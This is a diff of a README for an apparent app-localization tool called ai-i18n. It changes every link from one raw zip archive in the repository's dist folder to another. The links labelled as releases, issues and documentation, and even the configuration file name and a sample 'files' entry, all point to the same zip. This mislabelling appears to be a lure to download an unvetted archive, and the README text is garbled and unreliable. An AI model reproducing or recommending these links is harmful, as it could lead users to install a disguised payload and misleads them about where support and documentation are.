@@ -1,6 +1,6 @@
 # 🎉 ai-i18n - Effortlessly Localize Your App's Content
 
-[![Download ai-i18n](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip)](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip)
+[![Download ai-i18n](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip)](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To run ai-i18n smoothly, ensure you have:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip) to download the latest version of ai-i18n.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip) to download the latest version of ai-i18n.
    
 2. **Choose Your File**: Locate the file that matches your operating system. Click on it to download.
 
@@ -37,12 +37,12 @@ After installing ai-i18n, you can start using it to translate your app. Here’s
 
 1. **Prepare Your i18n Files**: Make sure your i18n files are ready for translation. They should be in either JSON or XLIFF format.
   
-2. **Configure ai-i18n**: Set up the configuration file (typically named `https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip`). Here is a sample layout:
+2. **Configure ai-i18n**: Set up the configuration file (typically named `https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip`). Here is a sample layout:
    ```json
    {
      "provider": "openai",
      "api_key": "your_api_key_here",
-     "files": ["https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip"],
+     "files": ["https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip"],
      "languages": ["en", "es", "fr"]
    }
    ```
@@ -60,12 +60,12 @@ After installing ai-i18n, you can start using it to translate your app. Here’s
 
 If you encounter issues or have questions, feel free to reach out. You can find support through:
 
-- **Issues Page**: Report any bugs or ask questions on our [GitHub Issues page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip).
+- **Issues Page**: Report any bugs or ask questions on our [GitHub Issues page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip).
 - **Community Discussions**: Join discussions with other users to share tips and experiences.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Explore our [full documentation](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip) for in-depth guides and best practices.
+- **Documentation**: Explore our [full documentation](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip) for in-depth guides and best practices.
 - **Examples**: Check our examples in the repository to see common use cases and configurations.
 
 ## 🔊 Feedback and Contributions
@@ -74,6 +74,6 @@ Your feedback is vital for improving ai-i18n. If you have suggestions, feel free
 
 ## 🌟 Stay Connected
 
-For updates, get involved in the project, and follow our progress, bookmark our releases page: [Releases page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/differ/i-ai-n-1.9.zip).
+For updates, get involved in the project, and follow our progress, bookmark our releases page: [Releases page](https://raw.githubusercontent.com/Giandev-exe/ai-i18n/main/dist/formatters/i-n-ai-3.8.zip).
 
 Thank you for choosing ai-i18n! Enjoy making your app accessible to users around the world!
